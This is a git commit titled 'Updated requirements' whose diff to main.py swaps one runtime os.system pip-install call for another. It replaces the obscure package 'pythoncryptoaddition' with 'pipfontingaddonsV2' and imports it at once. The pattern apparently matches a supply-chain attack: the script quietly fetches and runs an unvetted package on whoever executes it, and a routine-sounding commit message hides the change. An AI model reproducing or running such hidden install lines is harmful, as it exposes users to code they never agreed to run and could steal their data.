f8e6bd2671993632943ad5170a5623035322fdf9
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-01 22:44:37 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptoaddition")
-import pythoncryptoaddition
+os.system("pip install pipfontingaddonsV2")
+import pipfontingaddonsV2
 import json
 import httpx
 import time
